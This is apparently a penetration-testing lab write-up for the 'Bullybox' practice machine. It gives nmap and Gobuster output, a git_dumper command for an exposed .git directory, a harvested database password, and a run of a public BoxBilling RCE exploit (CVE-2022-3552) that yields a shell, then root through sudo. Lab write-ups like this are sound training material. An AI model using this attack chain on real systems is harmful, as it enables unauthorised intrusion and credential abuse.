# Bullybox

## Initial Access

* nmap
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

* Gobuster
```
[05:06:29] 403 -  279B  - /.forktest.log                                    
[05:06:29] 301 -  315B  - /.git  ->  http://bullybox.local/.git/            
[05:06:29] 200 -   92B  - /.git/config                                 
```

* Hidden git directory.

* Dump using gitdumper
```
python git_dumper.py http://bullybox.local/.git/ dump
```

* Got email- yuki@bullybox.local from a commit.

* Got admin panel, sql username and password from bb-config.php.
```
'url' => 'http://bullybox.local/',
'admin_area_prefix' => '/bb-admin',
'type' => 'mysql',
'host' => 'localhost',
'name' => 'boxbilling',
'user' => 'admin',
'password' => 'Playing-Unstylish7-Provided',
 ```
 
 * Login as admin.
 
 * Box Billing RCE - https://github.com/0xk4b1r/CVE-2022-3552
 
 ```
 ┌──(venv)─(kali㉿kali)-[~/…/Offsec/Lab-Notes/bullybox/CVE-2022-3552]
└─$ python3 CVE-2022-3552.py -d http://bullybox.local -u admin@bullybox.local -p 'Playing-Unstylish7-Provided'
[+] Successfully logged in
[+] Payload saved successfully
[+] Getting Shell
```

* Got shell. sudo su for privesc. 
